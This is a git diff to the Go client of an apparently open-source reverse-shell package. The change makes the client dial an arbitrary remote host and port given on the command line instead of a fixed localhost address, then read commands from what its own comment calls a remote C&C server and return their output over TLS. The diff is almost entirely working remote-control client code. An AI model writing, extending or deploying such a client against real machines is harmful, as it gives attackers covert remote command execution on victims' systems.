@@ -11,6 +11,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"runtime"
 	"strings"
 
 	reverse "github.com/adedayo/reverse-shell/pkg"
@@ -24,42 +25,46 @@ var (
 )
 
 func main() {
-	server := "127.0.0.1"
-	port := "7788"
-	conn, err := tls.Dial("tcp", net.JoinHostPort(server, port), &config)
-	if err != nil {
-		log.Fatalf("Client dial error: %s", err)
-	}
-	defer conn.Close()
 
-	inbound := make(chan string)
-	outbound := make(chan string)
-	defer close(inbound)
-	defer close(outbound)
+	if len(os.Args) == 3 {
+		server := os.Args[1]
+		port := os.Args[2]
+		conn, err := tls.Dial("tcp", net.JoinHostPort(server, port), &config)
+		if err != nil {
+			log.Fatalf("Client dial error: %s", err)
+		}
+		defer conn.Close()
 
-	go runCommandProcessor(inbound, outbound)
+		inbound := make(chan string)
+		outbound := make(chan string)
+		defer close(inbound)
+		defer close(outbound)
 
-	//Read commands from remote C&C server
-	go func() {
-		reader := bufio.NewReader(conn)
-		for {
-			if line, err := reader.ReadString('\n'); err == nil {
-				line = strings.TrimSpace(line)
-				if len(line) > 0 {
-					inbound <- fmt.Sprintf("%s\n", line)
+		go runCommandProcessor(inbound, outbound)
+
+		//Read commands from remote C&C server
+		go func() {
+			reader := bufio.NewReader(conn)
+			for {
+				if line, err := reader.ReadString('\n'); err == nil {
+					line = strings.TrimSpace(line)
+					if len(line) > 0 {
+						inbound <- fmt.Sprintf("%s\n", line)
+					}
 				}
 			}
-		}
-	}()
+		}()
 
-	writer := bufio.NewWriter(conn)
-	for {
-		select {
-		case out := <-outbound:
-			fmt.Printf("Writing outbound: %s\n", out)
-			writer.WriteString(out)
-			writer.Flush()
+		writer := bufio.NewWriter(conn)
+		for {
+			select {
+			case out := <-outbound:
+				writer.WriteString(out)
+				writer.Flush()
+			}
 		}
+	} else {
+		fmt.Printf("Usage:\nclient-%s <remote-host> <remote-port>\n", runtime.GOOS)
 	}
 }
 
